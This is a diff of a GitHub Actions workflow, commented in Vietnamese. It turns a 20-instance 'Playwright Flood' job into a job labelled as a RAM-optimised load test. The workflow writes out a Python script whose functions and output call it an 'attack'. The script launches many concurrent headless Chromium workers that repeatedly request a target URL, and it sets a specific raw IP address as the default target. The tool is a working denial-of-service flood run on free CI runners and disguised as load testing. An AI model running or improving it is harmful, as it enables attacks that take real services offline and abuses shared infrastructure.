@@ -1,12 +1,11 @@
-name: Playwright Flood Python
-
+name: Load Test with RAM Optimization
 on:
   workflow_dispatch:
     inputs:
       target_url:
         description: 'URL cần test'
         required: true
-        default: 'https://example.com'
+        default: 'https://198.16.110.165/'
       duration:
         description: 'Thời gian test (giây)'
         required: true
@@ -17,27 +16,191 @@ on:
         default: '10'
 
 jobs:
-  flood:
+  load-test:
     runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8,9,10,11,12,13,14,15,16,17,18,19,20]
+    timeout-minutes: 10
+    
+    # GIỚI HẠN RAM - QUAN TRỌNG
+    container:
+      image: mcr.microsoft.com/playwright:python
+      options: >-
+        --memory=4g
+        --memory-swap=6g
+        --cpus=2
+        --shm-size=2g
+
     steps:
-      - uses: actions/checkout@v3
+    - name: Checkout code
+      uses: actions/checkout@v4
 
-      - name: Setup Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.12'
+    - name: Setup Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
 
-      - name: Install Playwright
-        run: |
-          pip install playwright
-          playwright install chromium
+    - name: Install dependencies
+      run: |
+        pip install playwright
+        playwright install chromium --with-deps
 
-      - name: Run Flood
-        env:
-          TARGET_URL: ${{ github.event.inputs.target_url }}
-          DURATION: ${{ github.event.inputs.duration }}
-          CONCURRENCY: ${{ github.event.inputs.concurrency }}
-        run: python playwright_flood.py
+    - name: Create optimized test script
+      run: |
+        cat > optimized_test.py << 'EOF'
+        import asyncio
+        import random
+        import time
+        import os
+        from playwright.async_api import async_playwright
+        
+        # Lấy tham số từ environment
+        TARGET_URL = os.getenv("TARGET_URL")
+        DURATION = int(os.getenv("DURATION", "45"))
+        CONCURRENCY = int(os.getenv("CONCURRENCY", "10"))
+        
+        # Giới hạn bộ nhớ cho mỗi tab
+        MAX_TABS_PER_BROWSER = 3
+        
+        success = 0
+        fail = 0
+        status_count = {}
+        
+        async def memory_efficient_attack(playwright, worker_id):
+            global success, fail, status_count
+            
+            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            
+            # Khởi tạo browser với cấu hình tiết kiệm bộ nhớ
+            browser = await playwright.chromium.launch(
+                headless=True,
+                args=[
+                    "--single-process",  # Tiết kiệm RAM
+                    "--no-zygote",      # Tiết kiệm RAM
+                    "--no-sandbox",
+                    "--disable-setuid-sandbox",
+                    "--disable-dev-shm-usage",
+                    "--disable-accelerated-2d-canvas",
+                    "--disable-gpu",
+                    "--disable-software-rasterizer",
+                    "--no-first-run",
+                    "--no-default-browser-check",
+                    "--disable-background-timer-throttling",
+                    "--disable-backgrounding-occluded-windows",
+                    "--disable-renderer-backgrounding",
+                    "--disable-extensions",
+                    "--disable-back-forward-cache",
+                    "--aggressive-cache-discard",
+                    "--disable-cache",
+                    "--disable-application-cache",
+                    "--disable-offline-load-stale-cache",
+                    "--disk-cache-size=0",
+                    "--media-cache-size=0",
+                    "--max-disk-cache-size=0"
+                ]
+            )
+            
+            start_time = time.time()
+            tabs_created = 0
+            
+            while time.time() - start_time < DURATION:
+                try:
+                    # Giới hạn số tab đồng thời
+                    if tabs_created >= MAX_TABS_PER_BROWSER:
+                        # Đóng browser cũ và mở browser mới để giải phóng RAM
+                        await browser.close()
+                        browser = await playwright.chromium.launch(
+                            headless=True,
+                            args=[
+                                "--single-process",
+                                "--no-zygote",
+                                "--no-sandbox",
+                                "--disable-dev-shm-usage"
+                            ]
+                        )
+                        tabs_created = 0
+                    
+                    context = await browser.new_context(
+                        user_agent=ua,
+                        viewport=None,  # Không set viewport để tiết kiệm RAM
+                        java_script_enabled=False  # Tắt JS nếu không cần
+                    )
+                    
+                    # Sử dụng request trực tiếp thay vì mở page để tiết kiệm RAM
+                    response = await context.request.get(TARGET_URL, timeout=10000)
+                    
+                    if response.status == 200:
+                        success += 1
+                    else:
+                        fail += 1
+                    status_count[response.status] = status_count.get(response.status, 0) + 1
+                    
+                    await context.close()
+                    tabs_created += 1
+                    
+                    # Delay ngẫu nhiên
+                    await asyncio.sleep(random.uniform(0.1, 0.5))
+                    
+                except Exception as e:
+                    fail += 1
+                    error_type = type(e).__name__
+                    status_count[error_type] = status_count.get(error_type, 0) + 1
+                    await asyncio.sleep(1)
+            
+            await browser.close()
+        
+        async def main():
+            print(f"Starting memory-efficient attack on {TARGET_URL}")
+            
+            async with async_playwright() as p:
+                tasks = []
+                for i in range(CONCURRENCY):
+                    # Phân phối đều các tasks
+                    if i % 3 == 0:
+                        await asyncio.sleep(0.5)  # Stagger startup
+                    tasks.append(memory_efficient_attack(p, i))
+                
+                await asyncio.gather(*tasks)
+            
+            total = success + fail
+            print(f"\n=== Memory-Efficient Result ===")
+            print(f"Total requests: {total}")
+            print(f"Success (2xx): {success}")
+            print(f"Fail/Blocked: {fail}")
+            print(f"RPS ~ {total / DURATION:.2f}")
+            print("Status breakdown:", dict(sorted(status_count.items())))
+        
+        if __name__ == "__main__":
+            asyncio.run(main())
+        EOF
+
+    - name: Run memory-optimized test
+      env:
+        TARGET_URL: ${{ inputs.target_url }}
+        DURATION: ${{ inputs.duration }}
+        CONCURRENCY: ${{ inputs.concurrency }}
+      run: |
+        # Giới hạn bộ nhớ cho Python process
+        export PYTHONGC=2  # Tăng frequency garbage collection
+        python optimized_test.py
+
+    - name: Monitor memory usage
+      run: |
+        # Log memory usage during test
+        while sleep 5; do
+            echo "Memory usage: $(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2}')"
+            echo "Swap usage: $(free -m | awk 'NR==3{printf "%.2f%%", $3*100/$2}')"
+        done &
+        MONITOR_PID=$!
+        
+        # Chạy test
+        python optimized_test.py
+        
+        # Dừng monitoring
+        kill $MONITOR_PID
+
+    - name: Upload results
+      uses: actions/upload-artifact@v3
+      with:
+        name: load-test-results
+        path: |
+          *.log
+          *.json
